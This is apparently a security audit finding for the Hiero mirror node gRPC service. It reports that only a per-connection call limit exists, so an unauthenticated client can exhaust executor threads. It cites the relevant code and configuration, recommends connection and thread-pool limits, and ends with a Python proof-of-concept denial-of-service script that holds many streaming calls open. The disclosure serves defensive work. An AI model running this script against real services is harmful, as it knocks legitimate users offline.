### Title
Unbounded Connection Multiplier Enables Executor Thread Exhaustion via Per-Connection-Only Call Limit

### Summary
`grpcServerConfigurer()` in `GrpcConfiguration.java` configures only `maxConcurrentCallsPerConnection` (defaulting to 5) with no server-wide inbound connection limit. An unprivileged external attacker can open an arbitrary number of TCP connections, each saturating its 5-stream quota with long-lived `subscribeTopic` streaming calls, consuming N×5 executor threads from the shared `applicationTaskExecutor`. Because Spring Boot's default `ThreadPoolTaskExecutor` has an effectively unbounded `maxPoolSize`, this leads to thread/memory exhaustion and complete service unavailability.

### Finding Description

**Exact code path:**

`grpc/src/main/java/org/hiero/mirror/grpc/config/GrpcConfiguration.java`, lines 27–35: [1](#0-0) 

```java
return serverBuilder -> {
    serverBuilder.executor(applicationTaskExecutor);
    serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
};
```

`NettyProperties.java` line 14 confirms the default of 5: [2](#0-1) 

**Root cause and failed assumption:** The design assumes that limiting calls *per connection* to 5 bounds total server load. This assumption fails because there is no call to `NettyServerBuilder.maxInboundConnections()` or any equivalent server-wide connection cap. The number of connections N is bounded only by OS file descriptor limits (typically 65535 per process on Linux). Each connection can hold 5 active streaming RPCs, so total concurrent calls = N × 5.

**Exploit flow:**
1. Attacker opens N TCP connections to port 5600 (no authentication required — the gRPC API is public).
2. On each connection, attacker issues 5 concurrent `subscribeTopic` streaming calls (the per-connection maximum).
3. Each active streaming call occupies one thread in `applicationTaskExecutor` for the duration of the subscription (up to `retriever.timeout = 60s`, but the attacker simply reconnects before timeout).
4. Spring Boot's `ThreadPoolTaskExecutor` (injected as `applicationTaskExecutor`) has `maxPoolSize = Integer.MAX_VALUE` by default — it will spawn new threads without bound.
5. With N=2000 connections: 10,000 threads are created, exhausting JVM heap and OS thread limits.

**Why existing checks fail:**
- `maxConcurrentCallsPerConnection = 5` is a *per-connection* ceiling, not a server-wide ceiling. It is the only Netty-level guard configured.
- No `maxInboundConnections`, `maxConnectionAge`, `maxConnectionIdle`, or `keepAliveTimeout` are set on the `NettyServerBuilder`.
- The nginx proxy in `docker-compose.yml` uses `keepalive 16` for upstream connections, but this only limits keepalive reuse — it does not cap total concurrent connections to the gRPC backend. [3](#0-2) 
- The `GrpcHighFileDescriptors` Prometheus alert fires only after 5 minutes at 80% FD usage — far too slow to prevent exhaustion. [4](#0-3) 

### Impact Explanation

Complete executor exhaustion causes all gRPC requests (including legitimate `subscribeTopic` calls) to either queue indefinitely or be rejected. The shared `applicationTaskExecutor` is used for all application-level work, so exhaustion affects the entire gRPC service. This is a full Denial of Service against the mirror node's gRPC API. Severity: **High** — no authentication required, no rate limiting, publicly reachable port, long-lived streaming calls amplify the effect.

### Likelihood Explanation

Preconditions: none beyond network access to port 5600. The gRPC API is intentionally public (it serves HCS topic subscriptions to any client). A single attacker machine can open thousands of TCP connections and HTTP/2 streams using standard gRPC client libraries (e.g., `grpc-java`, `grpcurl`, Python `grpc` library). The attack is repeatable and requires no special knowledge beyond the public proto definitions. The `subscribeTopic` endpoint is documented and its streaming nature makes it ideal for holding threads.

### Recommendation

Apply the following fixes to `grpcServerConfigurer()` in `GrpcConfiguration.java`:

1. **Add a server-wide inbound connection limit** via `NettyServerBuilder.maxInboundConnections(int)`. A value of 1000–5000 is typical for public APIs; tune based on expected legitimate load.
2. **Add connection age and idle limits** via `maxConnectionAge(long, TimeUnit)` and `maxConnectionIdle(long, TimeUnit)` to force connection recycling and prevent indefinite stream holding.
3. **Add `NettyProperties` fields** for these new limits (following the existing pattern of `maxConcurrentCallsPerConnection`) so they are configurable without code changes.
4. **Bound the `applicationTaskExecutor`** thread pool by configuring `spring.task.execution.pool.max-size` and `spring.task.execution.pool.queue-capacity` to finite values appropriate for the deployment.
5. Consider adding IP-level connection rate limiting at the infrastructure layer (nginx `limit_conn`, Kubernetes NetworkPolicy, or a WAF).

### Proof of Concept

```python
import grpc
import threading
from concurrent.futures import ThreadPoolExecutor

# Public proto: com.hedera.mirror.api.proto.ConsensusService/subscribeTopic
# Attacker opens N connections, each with 5 streaming calls

TARGET = "mirror-node-grpc-host:5600"
N_CONNECTIONS = 500  # 500 connections × 5 streams = 2500 executor threads

def exhaust_connection(_):
    channel = grpc.insecure_channel(TARGET)
    stub = ConsensusServiceStub(channel)
    streams = []
    for _ in range(5):  # maxConcurrentCallsPerConnection = 5
        req = ConsensusTopicQuery(topic_id=TopicID(topic_num=1))
        # Open streaming call and hold it open
        stream = stub.subscribeTopic(req)
        streams.append(stream)
    # Hold all 5 streams open indefinitely
    threading.Event().wait()

with ThreadPoolExecutor(max_workers=N_CONNECTIONS) as pool:
    list(pool.map(exhaust_connection, range(N_CONNECTIONS)))

# Expected result: gRPC server executor saturated with 2500 threads,
# legitimate clients receive RESOURCE_EXHAUSTED or hang indefinitely.
```

### Citations

**File:** grpc/src/main/java/org/hiero/mirror/grpc/config/GrpcConfiguration.java (L27-35)
```java
    @Bean
    ServerBuilderCustomizer<NettyServerBuilder> grpcServerConfigurer(
            GrpcProperties grpcProperties, Executor applicationTaskExecutor) {
        final var nettyProperties = grpcProperties.getNetty();
        return serverBuilder -> {
            serverBuilder.executor(applicationTaskExecutor);
            serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
        };
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/config/NettyProperties.java (L13-14)
```java
    @Min(1)
    private int maxConcurrentCallsPerConnection = 5;
```

**File:** docker-compose.yml (L190-190)
```yaml
      upstream grpc_host      { server grpc:5600;       keepalive 16; }
```

**File:** charts/hedera-mirror-grpc/values.yaml (L221-231)
```yaml
  GrpcHighFileDescriptors:
    annotations:
      description: "{{ $labels.namespace }}/{{ $labels.pod }} file descriptor usage reached {{ $value | humanizePercentage }}"
      summary: "Mirror gRPC API file descriptor usage exceeds 80%"
    enabled: true
    expr: sum(process_files_open_files{application="grpc"}) by (namespace, pod) / sum(process_files_max_files{application="grpc"}) by (namespace, pod) > 0.8
    for: 5m
    labels:
      severity: critical
      application: grpc
      area: resource
```
